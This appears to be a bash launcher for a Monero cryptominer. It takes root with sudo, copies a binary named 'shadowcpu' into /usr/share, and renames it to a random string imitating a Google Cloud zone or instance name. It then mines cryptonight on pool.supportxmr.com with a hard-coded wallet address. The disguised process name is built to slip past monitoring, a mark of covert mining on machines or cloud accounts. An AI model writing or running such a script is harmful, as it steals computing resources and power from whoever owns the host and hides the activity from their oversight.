#!/bin/bash
sudo -i 
a='0-us-central1-a-' && a1=$(shuf -i1-9 -n1) && a2='-' && b=$(shuf -i10-99 -n1) && c='-' && d=$(shuf -i100-999 -n1) && cpuname=$a$a1$a2$b$c$d && sleep 5 && cp -r /usr/share/work/ /usr/share/${cpuname}/ && cd /usr/share/${cpuname}/ && mv shadowcpu ${cpuname} && ./${cpuname} -a cryptonight -o pool.supportxmr.com:80 -u 47D2kVmxmoWXwVEiCrR9YrMLmD1VQA5SeHaK8HT4ScKxVweUeiynPcad8gm5wdhvq2eLexjjwkiDgF5J8f8xLhe913DUwaJ -p $cpuname
